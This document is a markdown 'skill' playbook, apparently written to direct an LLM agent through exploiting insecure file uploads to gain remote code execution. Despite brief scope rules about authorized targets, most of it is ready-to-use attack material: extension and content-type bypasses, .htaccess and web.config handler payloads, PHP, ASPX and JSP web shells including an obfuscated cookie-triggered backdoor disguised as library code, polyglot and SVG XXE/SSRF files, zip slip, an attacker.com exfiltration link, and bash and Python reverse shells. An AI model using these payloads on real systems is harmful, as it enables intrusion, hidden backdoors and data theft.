# File Upload Exploitation Skill

## Overview
Complete methodology for exploiting insecure file upload functionality to achieve
Remote Code Execution (RCE). Covers extension bypass, content-type manipulation,
magic bytes injection, web shell generation, polyglot files, EXIF metadata injection,
filename path traversal, and post-upload exploitation.
This is the LLM agent's step-by-step playbook — follow it top to bottom.

## Scope Rules
1. Only upload files to explicitly authorized targets.
2. Use benign proof-of-concept payloads (phpinfo, whoami) — not destructive shells.
3. Track every file uploaded: name, path, content, cleanup status.
4. Clean up all uploaded files after testing.
5. Record ALL upload attempts and server responses.

---

## Phase 1: Reconnaissance — Understanding the Upload

### 1.1 Upload Feature Discovery
Identify all file upload endpoints:
- Profile picture / avatar upload
- Document attachment features
- Import functionality (CSV, XML, JSON)
- Media upload (images, videos)
- Plugin / theme upload (CMS)
- Firmware / configuration upload
- Resume / CV upload portals
- Support ticket file attachments

### 1.2 Technology Fingerprinting
Determine the server-side technology (critical for payload selection):
- **PHP:** `.php`, `.php5`, `.php7`, `.phtml`, `.phar`
- **ASP.NET:** `.aspx`, `.asp`, `.ashx`, `.asmx`, `.config`
- **Java:** `.jsp`, `.jspx`, `.war`
- **Python:** `.py` (CGI), template injection
- **Node.js:** `.js` (if server interprets uploads)
- **Ruby:** `.rb` (CGI)

### 1.3 Upload Behavior Analysis
Upload a legitimate file first and observe:
- Where is the file stored? (URL path, separate domain, CDN)
- Is the filename preserved or randomized?
- Can you access the uploaded file directly via URL?
- What response headers does the server send for uploaded files?
- Does the server process/resize images? (indicates server-side handling)
- Are there file size limits?

---

## Phase 2: Extension Bypass Techniques

### 2.1 Alternative Extensions
When `.php` is blocked, try alternative extensions that may still execute:

```
# PHP alternatives
.php3, .php4, .php5, .php7, .phps, .pht, .phtml, .phar
.php.jpg          → double extension
.php.png
.php%00.jpg       → null byte (older systems — PHP < 5.3.4)
.php%0a.jpg       → newline injection
.pHp, .PhP        → case variation (Windows/IIS)
.php::$DATA       → NTFS alternate data stream (Windows/IIS)
.php.            → trailing dot (Windows)
.php...           → multiple trailing dots (Windows)
.php;.jpg         → semicolon (IIS)
.php%20           → trailing space (Windows)

# ASP alternatives
.asp, .aspx, .asa, .cer, .cdx, .ashx, .asmx
.asp;.jpg         → semicolon bypass (IIS)
.aspx%00.jpg
.config           → web.config for code execution

# JSP alternatives
.jsp, .jspx, .jsw, .jsv, .jtml
.war              → deployed as web application

# General tricks
file.php.XXX      → unknown extension may fall through to PHP handler
file.php/          → trailing slash
file.php%00       → null byte termination
```

### 2.2 Double Extension Attacks
Exploit misconfigured Apache/nginx that processes the last known extension:

```
# Apache mod_mime processes rightmost recognized extension
shell.php.blah        → Apache may ignore .blah, process as .php
shell.php.jpg.php     → Some configs catch this
shell.php.123         → Unknown extension → may fall through

# nginx + PHP-FPM path confusion
/uploads/shell.jpg/nonexistent.php   → cgi.fix_pathinfo=1 vulnerability
/uploads/shell.jpg%00.php            → null byte path info
```

### 2.3 .htaccess Upload (Apache)
If you can upload `.htaccess`, redefine what extensions execute as PHP:

```apache
# Upload .htaccess with this content:
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg

# Then upload shell.jpg — Apache will execute it as PHP
```

Alternative `.htaccess` payload:
```apache
<FilesMatch "\.jpg$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

### 2.4 web.config Upload (IIS)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="web_config" path="*.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
    </handlers>
    <security>
      <requestFiltering>
        <fileExtensions>
          <remove fileExtension=".config" />
        </fileExtensions>
      </requestFiltering>
    </security>
  </system.webServer>
</configuration>
```

---

## Phase 3: Content-Type Bypass

### 3.1 MIME Type Manipulation
Intercept the upload request and change the Content-Type header:

```http
# Original (blocked):
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

# Bypass — change to allowed MIME type:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
Content-Type: text/plain
```

### 3.2 Filename Manipulation in Request
```http
# Double filename (some parsers take last, some take first)
Content-Disposition: form-data; name="file"; filename="safe.jpg"; filename="shell.php"

# Encoded filename
Content-Disposition: form-data; name="file"; filename="shell%2Ephp"

# Unicode filename
Content-Disposition: form-data; name="file"; filename="shell.ⓟⓗⓟ"

# Path traversal in filename
Content-Disposition: form-data; name="file"; filename="../../../var/www/html/shell.php"
Content-Disposition: form-data; name="file"; filename="..%2F..%2F..%2Fvar/www/html/shell.php"

# Null byte in filename
Content-Disposition: form-data; name="file"; filename="shell.php%00.jpg"
```

---

## Phase 4: Magic Bytes & File Signature Bypass

### 4.1 File Signatures (Magic Bytes)
When the server checks file content (not just extension/MIME):

```bash
# JPEG: FF D8 FF E0 (or FF D8 FF E1 for EXIF)
printf '\xff\xd8\xff\xe0' > shell.php.jpg
cat payload.php >> shell.php.jpg

# PNG: 89 50 4E 47 0D 0A 1A 0A
printf '\x89PNG\r\n\x1a\n' > shell.php.png
cat payload.php >> shell.php.png

# GIF: GIF89a (simplest — pure ASCII)
echo 'GIF89a' > shell.php.gif
cat payload.php >> shell.php.gif
# Or as a one-liner:
echo 'GIF89a<?php system($_GET["c"]); ?>' > shell.gif

# BMP: 42 4D
printf '\x42\x4d' > shell.php.bmp
cat payload.php >> shell.php.bmp

# PDF: %PDF-1.4
echo '%PDF-1.4<?php system($_GET["c"]); ?>' > shell.pdf.php
```

### 4.2 Polyglot Files
Files that are simultaneously valid images AND executable code:

**PHP/JPEG Polyglot:**
```bash
# Start with a real JPEG image
cp legitimate.jpg polyglot.php.jpg

# Inject PHP into EXIF comment field
exiftool -Comment='<?php system($_GET["c"]); ?>' polyglot.php.jpg

# Or inject into other EXIF fields
exiftool -DocumentName='<?php system($_GET["c"]); ?>' polyglot.php.jpg
```

**PHP/GIF Polyglot:**
```php
GIF89a;
<?php system($_GET["c"]); ?>
```

**PHP/PNG Polyglot (survives reprocessing):**
```bash
# Use PNG IDAT chunk injection — payload survives imagecreatefrom*() functions
# Generate with tools like:
python3 png_payload_injector.py --payload '<?php system($_GET["c"]); ?>' --output polyglot.png
```

### 4.3 SVG Upload → XSS/XXE
SVG files are XML and may enable XSS or XXE:

```xml
<!-- SVG XSS payload -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
  <circle cx="50" cy="50" r="40"/>
</svg>

<!-- SVG XXE payload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>

<!-- SVG SSRF payload -->
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" />
</svg>
```

---

## Phase 5: Web Shell Payloads

### 5.1 PHP Shells
```php
# Minimal one-liner
<?php system($_GET["c"]); ?>

# Eval-based (more flexible)
<?php eval($_POST["code"]); ?>

# Phpinfo (safe PoC — proves execution without RCE)
<?php phpinfo(); ?>

# Short tags (if enabled)
<?=`$_GET[c]`?>

# Without parentheses (bypass filters)
<?php echo `$_GET[c]`; ?>

# Obfuscated
<?php $a='sys'.'tem'; $a($_GET['c']); ?>
<?php $_="{"; $_=($_^"<").($_## ^">").($_^"/"); $__=$_("/".$_); ?>
```

### 5.2 ASP/ASPX Shells
```asp
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
  string cmd = Request.QueryString["c"];
  Process p = new Process();
  p.StartInfo.FileName = "cmd.exe";
  p.StartInfo.Arguments = "/c " + cmd;
  p.StartInfo.RedirectStandardOutput = true;
  p.StartInfo.UseShellExecute = false;
  p.Start();
  Response.Write(p.StandardOutput.ReadToEnd());
%>
```

### 5.3 JSP Shells
```jsp
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("c");
  Process p = Runtime.getRuntime().exec(cmd);
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line;
  while ((line = br.readLine()) != null) out.println(line);
%>
```

### 5.4 Stealth Web Shells
```bash
# Generate with weevely (encrypted/obfuscated)
weevely generate MyPassword shell.php
# Connect: weevely http://target/uploads/shell.php MyPassword

# Minimal PHP shell that blends with legitimate code
<?php
// Image processing library v2.1
if(isset($_COOKIE['debug'])){@eval(base64_decode($_COOKIE['debug']));}
?>
```

---

## Phase 6: Advanced Bypass Techniques

### 6.1 Race Condition Upload
Some apps upload first, validate second, delete if invalid:
```bash
# Upload malicious file and immediately request it before validation
# Use Burp Intruder or parallel curl requests
for i in $(seq 1 100); do
  curl -s http://target/uploads/shell.php &
done &
curl -F 'file=@shell.php' http://target/upload
```

### 6.2 Image Reprocessing Bypass
When the server resizes/reprocesses uploaded images:
```bash
# Inject PHP into PNG IDAT chunks that survive imagecreatefrompng()
# The payload must be in compressed pixel data that survives re-encoding
# Use specialized tools or manual chunk crafting

# For GD library (PHP):
# Create image with specific pixel values that encode PHP when recompressed
# This is complex — use existing PoC tools

# For ImageMagick:
# ImageTragick (CVE-2016-3714) — command injection via image parsing
# payload.mvg:
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|id")'
pop graphic-context
```

### 6.3 Zip/Archive Upload Exploitation
```bash
# Zip slip — path traversal in archive entry names
python3 -c "
import zipfile
z = zipfile.ZipFile('malicious.zip', 'w')
z.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"c\"]); ?>')
z.close()
"

# Upload ZIP → app extracts → shell placed in web root
```

### 6.4 PDF Upload → SSRF/XSS
```html
<!-- PDF with JavaScript -->
%PDF-1.4
1 0 obj<</Pages 2 0 R>>endobj
2 0 obj<</Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj
4 0 obj<</Length 44>>stream
BT /F1 24 Tf 100 700 Td (SSRF PoC) Tj ET
endstream endobj

<!-- HTML-to-PDF generators may fetch external resources -->
<img src="http://169.254.169.254/latest/meta-data/">
<iframe src="http://127.0.0.1:8080/admin">
<link rel="stylesheet" href="http://attacker.com/exfil?data=leak">
```

---

## Phase 7: Post-Upload Exploitation

### 7.1 Finding the Upload Path
```bash
# Check response for upload path
# Common locations:
/uploads/
/upload/
/files/
/images/
/media/
/attachments/
/static/uploads/
/wp-content/uploads/
/user-content/

# If filename is randomized, check:
# - Response body for new filename/URL
# - Response headers (Location, X-File-Path)
# - Directory listing if enabled
# - Predictable patterns (timestamp, sequential ID)
```

### 7.2 Triggering Execution
```bash
# Direct access (simplest)
curl http://target/uploads/shell.php?c=id

# LFI chain — if upload path known but not directly accessible
# Use LFI vulnerability to include the uploaded file:
curl 'http://target/page?file=../../uploads/shell.php'

# PHP wrappers (if LFI available)
curl 'http://target/page?file=php://filter/convert.base64-decode/resource=uploads/shell'

# .htaccess execution (if uploaded .htaccess)
curl http://target/uploads/shell.jpg?c=id

# nginx path confusion
curl 'http://target/uploads/shell.jpg/nonexistent.php'
```

### 7.3 Upgrading to Full Shell
```bash
# From web shell to reverse shell:
# PHP web shell → reverse shell
curl 'http://target/uploads/shell.php?c=bash+-c+"bash+-i+>%26+/dev/tcp/LHOST/LPORT+0>%261"'

# Python reverse shell via web shell
curl 'http://target/uploads/shell.php?c=python3+-c+"import+socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])"'

# Or use weevely for interactive shell
weevely http://target/uploads/shell.php password
```

---

## Decision Tree — File Upload Attack Flow

```
UPLOAD FEATURE FOUND
│
├── Upload legitimate file → note path, filename handling, access URL
│
├── Server-side technology?
│   ├── PHP → .php, .phtml, .phar payloads
│   ├── ASP.NET → .aspx, .ashx, .config payloads
│   ├── Java → .jsp, .war payloads
│   └── Unknown → try all
│
├── ATTEMPT 1: Direct extension upload
│   ├── Accepted → trigger execution → RCE
│   └── Blocked → continue
│
├── ATTEMPT 2: Alternative extensions
│   ├── .php5, .phtml, .phar, etc.
│   └── Case variations: .pHp, .PHP
│
├── ATTEMPT 3: Double extension
│   ├── shell.php.jpg, shell.php.xxx
│   └── .htaccess upload → redefine handlers
│
├── ATTEMPT 4: Content-Type bypass
│   ├── Change MIME to image/jpeg
│   └── Modify filename in multipart header
│
├── ATTEMPT 5: Magic bytes bypass
│   ├── Prepend JPEG/PNG/GIF headers
│   └── EXIF injection with exiftool
│
├── ATTEMPT 6: Polyglot / SVG / Archive
│   ├── Polyglot JPEG+PHP
│   ├── SVG with XSS/XXE/SSRF
│   └── ZIP slip path traversal
│
└── ATTEMPT 7: Race condition / reprocessing bypass
    ├── Upload + rapid access before validation
    └── IDAT chunk injection surviving reprocessing
```

---

## Evidence Collection
1. `evidence.json` — upload endpoint, bypass used, file path, execution proof
2. `findings.json` — impact assessment, CVSS, affected functionality
3. `shells.json` — uploaded file details (name, path, content hash, cleanup status)
4. Screenshots of command execution output
5. Full HTTP request/response pairs for successful uploads

## MITRE ATT&CK Mappings
- T1190 — Exploit Public-Facing Application
- T1059 — Command and Scripting Interpreter
- T1505.003 — Web Shell

## Deep Dives
Load references when needed:
1. Extension bypass matrix: `references/extension_bypass.md`
2. Magic bytes reference: `references/magic_bytes.md`
3. Web shell collection: `references/webshells.md`
4. Polyglot generation: `references/polyglot_files.md`

## Success Criteria
- File upload restriction successfully bypassed
- Uploaded file confirmed executing server-side
- RCE demonstrated with safe PoC (phpinfo/whoami)
- All bypass techniques attempted documented
- Uploaded files tracked for cleanup
